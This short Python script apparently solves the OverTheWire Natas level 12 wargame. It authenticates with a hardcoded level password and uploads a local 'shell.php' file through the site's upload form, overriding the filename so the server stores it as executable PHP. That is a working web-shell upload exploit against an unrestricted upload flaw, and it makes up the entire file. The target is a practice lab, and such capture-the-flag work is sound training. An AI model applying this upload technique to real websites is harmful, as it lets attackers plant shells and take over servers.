import requests

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3' 

url = 'http://natas12.natas.labs.overthewire.org/' 

session = requests.Session()

shell_file = open('shell.php', 'rb')
response = session.post(url, files = {'uploadedfile' : shell_file}, data = { "filename": "shell.php", "MAX_FILE_SIZE" : 1000}, auth = (username, password))

print(response.text)
